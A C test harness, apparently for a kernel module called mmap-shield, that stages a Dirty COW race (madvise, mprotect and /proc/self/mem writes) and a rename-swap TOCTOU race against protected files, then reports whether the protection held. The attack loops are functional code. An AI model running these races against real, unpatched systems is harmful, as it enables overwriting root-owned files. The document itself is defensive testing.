/*
 * mmap-shield: simulacion de ataques de carrera (condiciones de carrera).
 *
 *   race_attacks <archivo_root_protegido> <victima_protegida> <senuelo>
 *       CARRERA 1: Dirty COW clasico. Un hilo descarta la copia privada con
 *                  madvise(MADV_DONTNEED), otro intenta volverla escribible con
 *                  mprotect y el hilo principal escribe por /proc/self/mem.
 *       CARRERA 2: TOCTOU por renombrado. Un hilo intercambia atomicamente los
 *                  nombres de la victima y del senuelo mientras el principal
 *                  abre el senuelo y lo mapea con escritura compartida.
 *
 *   race_attacks --stress <directorio> <segundos>
 *       Genera mmap/mprotect continuos para probar la descarga del modulo
 *       mientras hay llamadas en curso.
 *
 * Debe ejecutarse como usuario sin privilegios y con las dos primeras rutas
 * registradas en /proc/mmap_shield (lo hace tests/run_tests.sh).
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#define COLOR_RESET   "\033[0m"
#define COLOR_GREEN   "\033[1;32m"
#define COLOR_RED     "\033[1;31m"
#define COLOR_CYAN    "\033[1;36m"

#define RACE_SECONDS  3
#define PAGE          4096

static volatile int g_stop;

static double elapsed_s(const struct timespec *start)
{
    struct timespec now;

    clock_gettime(CLOCK_MONOTONIC, &now);
    return (double)(now.tv_sec - start->tv_sec) + (now.tv_nsec - start->tv_nsec) / 1e9;
}

static int read_head(const char *path, char *buf, size_t len)
{
    int fd = open(path, O_RDONLY);
    ssize_t n;

    if (fd < 0)
        return -1;
    memset(buf, 0, len);
    n = pread(fd, buf, len - 1, 0);
    close(fd);
    return n < 0 ? -1 : 0;
}

/* ------------------------------------------------------------------------- */
/* CARRERA 1: Dirty COW (CVE-2016-5195)                                       */
/* ------------------------------------------------------------------------- */

struct cow_ctx {
    void *map;
    long madvise_calls;
    long mprotect_attempts;
    long mprotect_granted;
};

static void *cow_madvise_thread(void *arg)
{
    struct cow_ctx *ctx = arg;

    while (!g_stop) {
        madvise(ctx->map, PAGE, MADV_DONTNEED);
        ctx->madvise_calls++;
    }
    return NULL;
}

/* Tries to turn the private copy of the read-only file into a writable one. */
static void *cow_mprotect_thread(void *arg)
{
    struct cow_ctx *ctx = arg;

    while (!g_stop) {
        ctx->mprotect_attempts++;
        if (mprotect(ctx->map, PAGE, PROT_READ | PROT_WRITE) == 0) {
            ctx->mprotect_granted++;
            mprotect(ctx->map, PAGE, PROT_READ);
        }
    }
    return NULL;
}

static bool race_dirty_cow(const char *path)
{
    struct cow_ctx ctx = {0};
    char before[64], after[64];
    pthread_t t_madv, t_mprot;
    struct timespec start;
    long writes = 0;
    int fd, mem;

    printf("[*] CARRERA 1: Dirty COW (madvise + mprotect + /proc/self/mem sobre %s)...\n", path);
    if (read_head(path, before, sizeof(before)) < 0 || (fd = open(path, O_RDONLY)) < 0) {
        printf("    %s[FALLO]%s No se pudo abrir el archivo protegido (%s)\n",
               COLOR_RED, COLOR_RESET, strerror(errno));
        return false;
    }

    /* Read-only private mapping: legitimate, must be allowed */
    ctx.map = mmap(NULL, PAGE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (ctx.map == MAP_FAILED) {
        printf("    %s[FALLO]%s El mapeo de solo lectura fue bloqueado (%s)\n",
               COLOR_RED, COLOR_RESET, strerror(errno));
        close(fd);
        return false;
    }

    mem = open("/proc/self/mem", O_RDWR);
    g_stop = 0;
    pthread_create(&t_madv, NULL, cow_madvise_thread, &ctx);
    pthread_create(&t_mprot, NULL, cow_mprotect_thread, &ctx);

    clock_gettime(CLOCK_MONOTONIC, &start);
    while (elapsed_s(&start) < RACE_SECONDS) {
        if (mem >= 0 && pwrite(mem, "HACKED_BY_DIRTY_COW", 19, (off_t)(unsigned long)ctx.map) == 19)
            writes++;
    }
    g_stop = 1;
    pthread_join(t_madv, NULL);
    pthread_join(t_mprot, NULL);
    if (mem >= 0)
        close(mem);
    munmap(ctx.map, PAGE);
    close(fd);

    bool intact = read_head(path, after, sizeof(after)) == 0 && strcmp(before, after) == 0;
    printf("    madvise: %ld | intentos mprotect(PROT_WRITE): %ld (concedidos: %ld) | "
           "escrituras /proc/self/mem: %ld\n",
           ctx.madvise_calls, ctx.mprotect_attempts, ctx.mprotect_granted, writes);
    printf("    Archivo en disco/page cache: %s\n", intact ? "intacto" : "MODIFICADO");

    if (intact && ctx.mprotect_granted == 0 && ctx.mprotect_attempts > 0) {
        printf("    %s[PASO]%s Ningun mprotect concedido y archivo intacto "
               "(las escrituras de /proc/self/mem solo tocan la copia privada)\n",
               COLOR_GREEN, COLOR_RESET);
        return true;
    }
    printf("    %s[FALLO DE SEGURIDAD]%s %s\n", COLOR_RED, COLOR_RESET,
           intact ? "mprotect concedio escritura sobre la copia COW" : "el archivo protegido fue alterado");
    return false;
}

/* ------------------------------------------------------------------------- */
/* CARRERA 2: TOCTOU por intercambio de nombres                               */
/* ------------------------------------------------------------------------- */

struct swap_ctx {
    const char *a;
    const char *b;
    long swaps;
};

static void *swap_thread(void *arg)
{
    struct swap_ctx *ctx = arg;

    while (!g_stop) {
        if (renameat2(AT_FDCWD, ctx->a, AT_FDCWD, ctx->b, RENAME_EXCHANGE) == 0)
            ctx->swaps++;
    }
    return NULL;
}

static bool race_toctou_rename(const char *victim, const char *decoy)
{
    struct swap_ctx ctx = { .a = victim, .b = decoy };
    long attempts_protected = 0, breaches = 0, benign_ok = 0, benign_denied = 0;
    struct timespec start;
    struct stat st;
    pthread_t t_swap;
    ino_t protected_ino;

    printf("[*] CARRERA 2: TOCTOU por intercambio de nombres (renameat2 RENAME_EXCHANGE)...\n");
    if (stat(victim, &st) != 0) {
        printf("    %s[FALLO]%s No existe la victima %s\n", COLOR_RED, COLOR_RESET, victim);
        return false;
    }
    protected_ino = st.st_ino;

    g_stop = 0;
    pthread_create(&t_swap, NULL, swap_thread, &ctx);

    clock_gettime(CLOCK_MONOTONIC, &start);
    while (elapsed_s(&start) < RACE_SECONDS) {
        int fd = open(decoy, O_RDWR);
        void *p;

        if (fd < 0)
            continue;
        if (fstat(fd, &st) != 0) {
            close(fd);
            continue;
        }
        p = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if (st.st_ino == protected_ino) {
            attempts_protected++;
            if (p != MAP_FAILED)
                breaches++;
        } else if (p != MAP_FAILED) {
            benign_ok++;
        } else {
            benign_denied++;
        }
        if (p != MAP_FAILED)
            munmap(p, PAGE);
        close(fd);
    }
    g_stop = 1;
    pthread_join(t_swap, NULL);

    printf("    Intercambios: %ld | aperturas del inodo protegido bajo otro nombre: %ld | "
           "mapeos escribibles obtenidos sobre el: %ld\n", ctx.swaps, attempts_protected, breaches);
    printf("    Archivo benigno: %ld mapeos permitidos, %ld rechazados "
           "(el nombre protegido apuntaba a el en ese instante)\n", benign_ok, benign_denied);

    if (breaches == 0 && attempts_protected > 0) {
        printf("    %s[PASO]%s La proteccion sigue al inodo: ningun mapeo escribible del archivo protegido\n",
               COLOR_GREEN, COLOR_RESET);
        return true;
    }
    if (attempts_protected == 0) {
        printf("    %s[FALLO]%s La carrera no llego a abrir el inodo protegido; repita la prueba\n",
               COLOR_RED, COLOR_RESET);
        return false;
    }
    printf("    %s[FALLO DE SEGURIDAD]%s Se obtuvieron %ld mapeos escribibles del archivo protegido\n",
           COLOR_RED, COLOR_RESET, breaches);
    return false;
}

/* ------------------------------------------------------------------------- */
/* Carga continua para la prueba de descarga del modulo                        */
/* ------------------------------------------------------------------------- */

static int stress(const char *dir, int seconds)
{
    char path[4096];
    char data[16 * PAGE];
    struct timespec start;
    long iterations = 0;
    int fd;

    snprintf(path, sizeof(path), "%s/stress-XXXXXX", dir);
    fd = mkstemp(path);
    if (fd < 0) {
        perror("mkstemp");
        return 1;
    }
    unlink(path);
    memset(data, 'S', sizeof(data));
    if (write(fd, data, sizeof(data)) != (ssize_t)sizeof(data)) {
        perror("write");
        close(fd);
        return 1;
    }

    clock_gettime(CLOCK_MONOTONIC, &start);
    while (elapsed_s(&start) < seconds) {
        void *f = mmap(NULL, sizeof(data), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
        void *a = mmap(NULL, sizeof(data), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

        if (f != MAP_FAILED) {
            mprotect(f, sizeof(data), PROT_READ);
            munmap(f, sizeof(data));
        }
        if (a != MAP_FAILED) {
            ((volatile char *)a)[0] = 1;
            mprotect(a, sizeof(data), PROT_READ);
            munmap(a, sizeof(data));
        }
        iterations++;
    }
    close(fd);
    printf("    Carga completada: %ld iteraciones de mmap/mprotect/munmap en %d s\n", iterations, seconds);
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc == 4 && strcmp(argv[1], "--stress") == 0)
        return stress(argv[2], atoi(argv[3]));

    if (argc != 4) {
        fprintf(stderr, "Uso: %s <archivo_root_protegido> <victima_protegida> <senuelo>\n"
                        "     %s --stress <directorio> <segundos>\n", argv[0], argv[0]);
        return 2;
    }

    printf("\n%s======================================================================%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s   mmap-shield: Simulacion de Ataques de Carrera (uid=%d)%s\n", COLOR_CYAN, getuid(), COLOR_RESET);
    printf("%s======================================================================%s\n\n", COLOR_CYAN, COLOR_RESET);

    int passed = 0;
    if (race_dirty_cow(argv[1]))
        passed++;
    if (race_toctou_rename(argv[2], argv[3]))
        passed++;

    printf("\n Resumen de Carreras: %s%d de 2 superadas con exito%s\n\n",
           passed == 2 ? COLOR_GREEN : COLOR_RED, passed, COLOR_RESET);
    return passed == 2 ? 0 : 1;
}
